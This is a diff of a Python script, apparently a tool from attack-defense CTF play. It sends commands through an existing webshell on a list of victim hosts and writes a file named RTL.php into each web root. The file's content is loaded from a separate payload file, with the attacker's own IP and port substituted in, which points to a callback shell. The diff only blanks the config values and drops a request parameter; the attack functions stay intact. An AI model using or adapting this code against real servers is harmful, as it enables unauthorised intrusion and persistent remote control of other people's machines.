@@ -5,13 +5,13 @@
 import requests
 
 config = {
-  "v_ip" : ['192.168.142.133'],
-  "file" : "test.php",
-  "passwd" : "a",
-  "method" : "SYSTEM_GET",
-  "self_ip": "192.168.142.1",
-  "self_port": "8888",
-  "code_file": "codebash.txt"
+  "v_ip" : [''],
+  "file" : "",
+  "passwd" : "",
+  "method" : "",
+  "self_ip": "",
+  "self_port": "",
+  "code_file": ""
 }
 
 def UploadFile_eval_POST(url, passwd):
@@ -19,8 +19,7 @@ def UploadFile_eval_POST(url, passwd):
   code = file.read().replace('0.0.0.0', config['self_ip']).replace('0000', config['self_port'])
   file_content = 'file_put_contents("/var/www/html/RTL.php", "%s");' % code
   j = {
-    passwd : file_content,
-    "rtl" : "rtl666"
+    passwd : file_content
   }
   res = requests.post(url, data=j)
   print(res.text)
@@ -30,8 +29,7 @@ def UploadFile_eval_GET(url, passwd):
   code = file.read().replace('0.0.0.0', config['self_ip']).replace('0000', config['self_port'])
   file_content = 'file_put_contents("/var/www/html/RTL.php", "%s");' % code
   j = {
-    passwd : file_content,
-    "rtl" : "rtl666"
+    passwd : file_content
   }
   res = requests.get(url, params=j)
   print(res.text)
@@ -41,8 +39,7 @@ def UploadFile_system_POST(url, passwd):
   code = file.read().replace('0.0.0.0', config['self_ip']).replace('0000', config['self_port'])
   file_content = 'echo "%s" > /var/www/html/RTL.php' % code
   j = {
-    passwd : file_content,
-    "rtl" : "rtl666"
+    passwd : file_content
   }
   res = requests.post(url, data=j)
   print(res.text)
@@ -52,8 +49,7 @@ def UploadFile_system_GET(url, passwd):
   code = file.read().replace('0.0.0.0', config['self_ip']).replace('0000', config['self_port'])
   file_content = 'echo "%s" > /var/www/html/RTL.php' % code
   j = {
-    passwd : file_content,
-    "rtl" : "rtl666"
+    passwd : file_content
   }
   res = requests.get(url, params=j)
   print(res.text)
